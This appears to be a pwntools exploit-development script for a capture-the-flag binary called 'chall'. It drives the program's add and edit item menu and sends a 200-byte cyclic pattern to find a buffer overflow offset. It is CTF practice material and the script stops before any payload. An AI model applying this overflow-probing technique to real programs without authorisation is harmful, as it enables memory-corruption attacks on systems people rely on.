from pwn import *

p = process('./chall')
print(p.pid)

def add(name, price):
    p.sendlineafter(b"> ", b"1")
    p.sendlineafter(b"Item name: ", name)
    p.sendlineafter(b"Item price: ", str(price).encode())

def edit(idx, name, price):
    p.sendlineafter(b"> ", b"2")
    p.sendlineafter(b"Item index", str(idx).encode())
    p.sendlineafter(b"Item name: ", name)
    p.sendlineafter(b"Item price: ", str(price).encode())

add(b"A"*8, 1)
add(b"B"*8, 1)

edit(0, cyclic(200), 1)

print(cyclic_find(0x6261616b6261616a))

p.interactive()